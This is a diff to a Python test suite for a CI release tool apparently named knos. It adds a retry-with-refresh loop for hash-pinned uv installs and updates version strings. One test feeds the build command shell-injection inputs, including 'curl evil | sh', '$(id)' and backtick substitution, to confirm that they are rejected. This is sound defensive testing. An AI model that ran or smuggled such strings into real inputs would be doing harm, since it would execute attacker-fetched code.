@@ -68,6 +68,15 @@ LOCKED_INSTALL = (
     'uv venv --no-config --python 3.12 "$RUNNER_TEMP/knos"\n'
     'uv pip install --no-config --python "$RUNNER_TEMP/knos/bin/python" --require-hashes --no-deps --no-build -r - <<\'LOCK\'\n'
     'KNOS_LOCK\nLOCK\necho "$RUNNER_TEMP/knos/bin" >> "$GITHUB_PATH"\n')
+# The same list written to a file and installed up to 3 times, the second and third with --refresh: PyPI's index can lag
+# a release's upload (the jobs of attest.yml, the settle job of prove.yml and the worker's claims job).
+RETRY = ('refresh=""\nfor nap in 10 30 end; do\n'
+         '  uv pip install --no-config $refresh --python "$RUNNER_TEMP/knos/bin/python" --require-hashes --no-deps --no-build -r "$RUNNER_TEMP/knos.lock" && break\n'
+         '  [ "$nap" != end ] || exit 1\n  echo "The install failed: asking PyPI\'s index again (--refresh) in $nap s."\n'
+         '  refresh="--refresh"\n  sleep "$nap"\ndone\n')
+RETRIED_INSTALL = LOCKED_INSTALL.replace("uv pip install --no-config --python \"$RUNNER_TEMP/knos/bin/python\" --require-hashes --no-deps --no-build -r - <<'LOCK'\nKNOS_LOCK\nLOCK\n",
+                                         "cat > \"$RUNNER_TEMP/knos.lock\" <<'LOCK'\nKNOS_LOCK\nLOCK\n" + RETRY)
+RETRIED = {(ATTEST, "attest"), (ATTEST, "refused")}
 
 
 # The two jobs outside the pinned workflows that ask GitHub for a token with steps of their own. Neither token is one a
@@ -115,8 +124,9 @@ def _install(name: str, job: str) -> str:
     if (name, job) == ("prove.yml", "settle"):     # the lock goes to a file, and PyPI is waited for first (tests/test_pypi_wait.py)
         run = next(str(s["run"]) for s in _steps(_jobs(name)[job]) if "--require-hashes" in str(s.get("run") or ""))
         wait = run[run.index("python3 -I - "):run.index("\nWAIT\n") + 6]
-        return LOCKED_INSTALL.replace("uv pip install", 'cat > "$RUNNER_TEMP/knos.lock" <<\'LOCK\'\nKNOS_LOCK\nLOCK\n' + wait + "uv pip install", 1).replace(
-            "-r - <<'LOCK'\nKNOS_LOCK\nLOCK\n", '-r "$RUNNER_TEMP/knos.lock"\n')
+        return RETRIED_INSTALL.replace(RETRY, wait + RETRY, 1)
+    if (name, job) in RETRIED:
+        return RETRIED_INSTALL
     if (name, job) in LOCKED:
         return LOCKED_INSTALL
     return (JUDGE_INSTALL if job == "judge" else INSTALL).format(release=_release())
@@ -1151,7 +1161,7 @@ def test_attest_takes_facts_never_code_reads_the_public_record_and_asks_for_one_
     assert [s["uses"].split("@")[0] for s in _steps(job) if "uses" in s] == ["astral-sh/setup-uv"] and _steps(job, "astral-sh/setup-uv@")[0]["with"] == SETUP_UV
     # (between them, one step holds the first job's verdict to what every reader reads the same way; it is given that
     # text and nothing else: no token, no input)
-    assert _scripts(job) == [LOCKED_INSTALL, GATE[ATTEST, "attest"], ATTEST_COMMAND]
+    assert _scripts(job) == [RETRIED_INSTALL, GATE[ATTEST, "attest"], ATTEST_COMMAND]
     [shape] = [s for s in _steps(job) if s.get("run") == GATE[ATTEST, "attest"]]
     assert shape["env"] == {"KNOS_RERUN": "${{ needs.rerun.outputs.verdict }}"} and "if" not in shape
     assert not re.search(r"\bgit\b|refs/pull|gh pr checkout", "\n".join(_scripts(job)))
@@ -1500,7 +1510,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.23 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.24 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1537,7 +1547,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.23 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.24 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
